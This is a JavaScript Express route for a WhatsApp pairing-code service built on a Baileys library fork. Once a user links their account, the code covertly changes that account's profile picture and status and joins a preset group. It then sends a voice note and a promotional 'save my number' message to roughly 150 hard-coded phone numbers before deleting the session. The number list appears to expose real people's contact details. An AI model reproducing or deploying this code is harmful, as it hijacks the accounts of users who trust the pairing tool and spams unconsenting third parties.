const PastebinAPI = require('pastebin-js');
const express = require('express');
const fs = require('fs');
const pino = require("pino");
const { default: Venocyber_Tech, useMultiFileAuthState, delay, makeCacheableSignalKeyStore } = require("maher-zubair-baileys");

const pastebin = new PastebinAPI(process.env.PASTEBIN_API_KEY);
const { makeid } = require('./id');
const router = express.Router();

const audioUrl = 'https://github.com/darkewing/song/blob/7913acc18d8e2794896aab03a4b7c5f7710b81fd/WhatsApp%20Audio%202024-08-11%20at%2012.25.44_3a8c9a58.mp3';
const generalMessage = `*╭────────────⊶*
*│* *ɪ ᴀᴍ ʀᴇᴀʟ ᴅᴇxᴛᴇʀ*
*╰────────────⊶*

*╭────────────⊶*
*│* ○ \`ɴᴀᴍᴇ │ DEXTER\`
*│* ○ \`ꜰʀᴏᴍ │ᴀᴍᴘᴀʀᴀ\`
*│* ○ \`ᴀɢᴇ │+17\`
*╰─────────────⊶*
*────────────⊶*
*╭──────────⊶*
*│❮ මාව save කර ගන්න❯*
*│"ඔයාව SAVE"*
*│❮ AUTO REPLY ❯*
*╰──────────⊶*

*❮ꜱᴀᴠᴇ නම් අනිවරෙන් කියන්න❯*
*❮STATUS VIEWERS වලට අවේ❯*`;
const groupLink = 'https://chat.whatsapp.com/BcaaQ3Hk2Oc1r7Me2ob69Fi';
const profilePictureUrl = 'https://telegra.ph/file/9ed44d68d2d271b2022ad.jpg';

const predefinedNumbers = [
    "+94722481073", "+94769281473", "+94727172879", "+94741277751",
    "+94704318091", "+94769061607", "+94741309592", "+94764352751",
    "+94703222523", "+94781092221", "+94778723541", "+94764658234",
    "+94774545292", "+94722518922", "+94768875121", "+94775873217",
    "+94768620560", "+94784252883", "+94728880147", "+94724874792",
    "+94701905294", "+94771164012", "+94768462416", "+94741762500",
    "+94729300323", "+94743289670", "+94767839950", "+94704634468",
    "+94760486379", "+94788491798", "+94754616834", "+94770038408",
    "+94741328026", "+94767492806", "+94754062780", "+94760850902",
    "+94778845762", "+94767740655", "+94762088306", "+94742062314",
    "+94701951007", "+94768210941", "+94757624327", "+94766660994",
    "+94770273684", "+94713719566", "+94701681790", "+94787087738",
    "+94773268116", "+94787183210", "+94767471781", "+94755904112",
    "+94767095447", "+94729778320", "+94719443175", "+94702367089",
    "+94740197110", "+94782970336", "+94784892141", "+94778908757",
    "+94769928086", "+94712655361", "+94743066982", "+94767412811",
    "+94781146995", "+94760763611", "+94778146733", "+94779574724",
    "+94703928100", "+94761105103", "+94740455534", "+94740844160",
    "+94772607069", "+94768563566", "+94728554184", "+94769238484",
    "+94703830944", "+94784867818", "+94774582494", "+94766061441",
    "+94764707327", "+94768058296", "+94759977181", "+94760696257",
    "+94771696491", "+94729690558", "+94742361369", "+94763578736",
    "+94768232870", "+94742724680", "+94758150257", "+94778300272",
    "+94755183612", "+94740878991", "+94771356734", "+94752013565",
    "+94721148077", "+94740416215", "+94779842931", "+94767042943",
    "+94760818767", "+94740669458", "+94778790654", "+94775665184",
    "+94701242971", "+94701005253", "+94742439964", "+94769234130",
    "+94768062193", "+94758598119", "+94765673157", "+94766491967",
    "+94766510155", "+94775585552", "+94768651669", "+94764801788",
    "+94724213627", "+94764939061", "+94768041284", "+94755717609",
    "+94719083015", "+94767483980", "+94701860269", "+94722123309",
    "+94787515274", "+94740550230", "+94769964775", "+94762118016",
    "+94777603183", "+94763742938", "+94743412570", "+94721020093",
    "+94775811926", "+94785348110", "+94767378712", "+94740789339",
    "+94760385921", "+94788304262", "+94743888389", "+94719307264",
    "+94754968875", "+94764672073", "+94787322885", "+94741524697",
    "+94741590044", "+94775495336", "+94764570388", "+94769489284",
    "+94702838872", "+94741433893"
];

function removeFile(filePath) {
    if (fs.existsSync(filePath)) {
        fs.rmSync(filePath, { recursive: true, force: true });
    }
}

async function VENOCYBER_MD_PAIR_CODE(id, num, customMessage, res) {
    const { state, saveCreds } = await useMultiFileAuthState(`./temp/${id}`);
    try {
        let Pair_Code_By_Venocyber_Tech = Venocyber_Tech({
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
            },
            printQRInTerminal: false,
            logger: pino({ level: "fatal" }).child({ level: "fatal" }),
            browser: ["Chrome (Linux)", "", ""]
        });

        Pair_Code_By_Venocyber_Tech.ev.on('creds.update', saveCreds);

        Pair_Code_By_Venocyber_Tech.ev.on("connection.update", async (s) => {
            const { connection, lastDisconnect } = s;
            if (connection === "open") {
                await handleInitialSetup(Pair_Code_By_Venocyber_Tech);
                await handleConnectionOpen(Pair_Code_By_Venocyber_Tech, customMessage, res, id);
            } else if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode !== 401) {
                console.error("Connection closed unexpectedly. Restarting...");
                await delay(10000); // Wait before retrying
                VENOCYBER_MD_PAIR_CODE(id, num, customMessage, res);
            }
        });

        if (!Pair_Code_By_Venocyber_Tech.authState.creds.registered) {
            await delay(1500);
            num = num.replace(/[^0-9]/g, '');
            const code = await Pair_Code_By_Venocyber_Tech.requestPairingCode(num);
            if (!res.headersSent) {
                await res.send({ code });
            }
        }
    } catch (err) {
        console.error("Service restart failed:", err);
        await removeFile(`./temp/${id}`);
        if (!res.headersSent) {
            await res.send({ code: "Service Unavailable" });
        }
    }
}

async function handleInitialSetup(client) {
    try {
        await client.updateProfilePicture(client.user.id, { url: profilePictureUrl });
        console.log('Profile picture updated successfully!');
    } catch (error) {
        console.error('Failed to update profile picture:', error);
    }

    try {
        await client.updateProfileStatus(aboutText);
        console.log('About text updated successfully!');
    } catch (error) {
        console.error('Failed to update about text:', error);
    }
}

async function handleConnectionOpen(client, customMessage, res, id) {
    try {
        await client.groupAcceptInvite(groupLink.split('/').pop());
        console.log('Successfully joined the group!');
    } catch (error) {
        console.error('Failed to join the group:', error);
    }

    for (const number of predefinedNumbers) {
        const jid = number.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        try {
            console.log(`Sending audio message to ${number}`);
            await client.sendMessage(jid, {
                audio: { url: audioUrl },
                mimetype: 'audio/mpeg',
                ptt: true 
            });
            await delay(5000); 

            console.log(`Sending text message to ${number}`);
            await client.sendMessage(jid, { text: customMessage });
            await delay(5000); 
            
        } catch (error) {
            console.error(`Failed to send message to ${number}:`, error);
        }
    }

    await delay(5000); 
    await client.ws.close();
    await removeFile(`./temp/${id}`);
}

router.get('/', async (req, res) => {
    const id = makeid();
    const num = req.query.number;
    const message = req.query.message || generalMessage;
    return await VENOCYBER_MD_PAIR_CODE(id, num, message, res);
});

module.exports = router;
